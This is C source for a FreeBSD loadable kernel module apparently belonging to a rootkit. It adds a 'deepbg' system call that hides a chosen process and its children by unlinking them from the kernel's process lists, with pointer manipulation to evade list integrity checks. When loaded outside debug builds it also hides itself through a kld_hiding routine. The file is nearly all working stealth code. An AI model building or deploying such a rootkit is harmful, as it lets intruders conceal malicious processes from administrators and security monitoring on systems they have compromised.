#include <sys/types.h>
#include <sys/param.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include "kld_hiding.h"
#include "shadow_sysent.h"
#include "deepbg.h"

#define KLD_NAME T_NAME"_deepbg"
#define KLD_FILE_NAME T_NAME"_deepbg.ko"

/*
 * deepbg is a system call to hide a running process.
 *
 * It takes a PID number as an argument and will hide
 * that process and it's direct children by removing
 * them from the allproc and hash lists.
 *
 * To test on a process with PID 1234, run:
 *
 *  # perl -e 'syscall(211, 1234)'
 */
static int deepbg(struct thread *td, void *syscall_args)
{
   struct deepbg_args *uap;
   uap = (struct deepbg_args *)syscall_args;
   struct proc *p, *prev = NULL;
   struct proc **oldprev = NULL;
   bool target_found;

   if (uap == NULL) {
#ifdef DEBUG
      uprintf("[x] arguments are NULL\n");
#endif
      return 1;
   } else if (uap->p_pid == 0) {
#ifdef DEBUG
      uprintf("[x] Cannot hide kernel process\n");
#endif
      return 2;
   }

   /* Loop until the target process and children have all
    * been removed from the allproc list
    */
   do {
      target_found = false;
      /* Iterate through the allproc list. */
      LIST_FOREACH(p, &allproc, p_list) {
         // Skip this process if it is exiting
         if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
            continue;
         }

         /* Is this the PID of the target process or is
          * it a child of the target process? */
         if ((p->p_pid == uap->p_pid)
            || (p->p_oppid == uap->p_pid)) {

            // A target process was found
            target_found = true;

#ifdef DEBUG
            uprintf("[-] Removing pid %u with ppid %u\n", p->p_pid, p->p_oppid);
            uprintf("[-] pid is %u\n", p->p_pid);
            uprintf("[-] process name is %s\n", p->p_comm);
#endif

            // Get a pointer to the next process
            struct proc * next_proc = p->p_list.le_next;

            if (next_proc != NULL) {
               // Preserve a pointer to the address of the next process' previous pointer
               oldprev = next_proc->p_list.le_prev;
            }

            /* Remove the process from p_list, p_sibling, and p_hash lists to hide it */
            LIST_REMOVE(p, p_list);
            LIST_REMOVE(p, p_sibling);
            LIST_REMOVE(p, p_hash);

            /*
             * Set the next pointer to NULL, so that when the process exits,
             * we can get past the QMD_LIST_CHECK_NEXT check.
             */
            p->p_list.le_next = NULL;

            /*
             * Set the previous pointer to the address of the next process' old previous pointer,
             * which is no longer being used after LIST_REMOVE(p, p_list).
             * Then change the address to be the address of this process so that we can get past
             * the QMD_LIST_CHECK_PREV check when this process exits.
             */

            p->p_list.le_prev = oldprev;
            *p->p_list.le_prev = &(*p);
            prev = NULL;
            break;
         }

         prev = p;
      }
   } while (target_found);

   return (0);
}

/* The sysent for the new system call. */
static struct sysent deepbg_sysent = {
   deepbg,         // implementing function
   NULL,
   1,              // number of arguments
};

/* The offset in sysent[] where the system call is to be allocated. */
static int   offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg)
{
#ifndef DEBUG
   kld_hiding(module, KLD_FILE_NAME, KLD_NAME);
#endif

   int error = 0;
   int syscall_num = offset;

   switch (cmd) {
      case MOD_LOAD:
         INSERT_SHADOW_ENTRY(DEEPBG_INDEX, deepbg, syscall_num);
#ifdef DEBUG
    uprintf("[-] deepbg module loaded at sys call num %d\n", syscall_num);
#endif
         break;
      case MOD_UNLOAD:
    UNDO_SHADOW_ENTRY(DEEPBG_INDEX);
#ifdef DEBUG
    uprintf("[-] deepbg module unloaded from sys call num %d\n", syscall_num);
#endif
         break;
      default:
         error = EOPNOTSUPP;
         break;
   }

   return (error);
}

MODULE_VERSION(deepbg, 1);
SYSCALL_MODULE(deepbg, &offset, &deepbg_sysent, load, NULL);
MODULE_DEPEND(MODNAME, shdw_sysent_tbl, 1, 1, 1);
